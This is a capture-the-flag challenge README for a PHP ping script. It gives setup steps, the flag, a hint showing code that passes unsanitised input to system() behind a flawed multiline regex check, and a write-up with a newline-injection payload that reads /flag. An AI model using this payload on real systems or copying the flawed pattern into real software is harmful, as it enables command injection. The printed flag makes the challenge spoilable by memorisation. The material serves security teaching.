# My First PHP Script

## Challenge Text
```
Kevin has created a ping script so that he doesn't have to fire up a terminal to check for internet connectivity. He uses system() to call /bin/ping, but he validates the user input to make sure it's a valid IP first so it can't be that bad right?

Connect: `[IP] 8080`

The flag is located at /flag
```

## Setup
1. build docker with `cd service && ./build.sh`
2. run docker with `cd service && ./run.sh`

## Flag
`HNF{D3V1L_1N_TH3_D3T41L5}`

## Hint
The important bit:
```
if(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\z/m',$_GET['ip'])){
system("ping -c 2 -W 1 " . $_GET['ip']);
}

```
## Writeup
go to /index.php?ip=%0acat /flag%0a127.0.0.1
/m flag means multiline search so it will match 127.0.0.1 and let the command through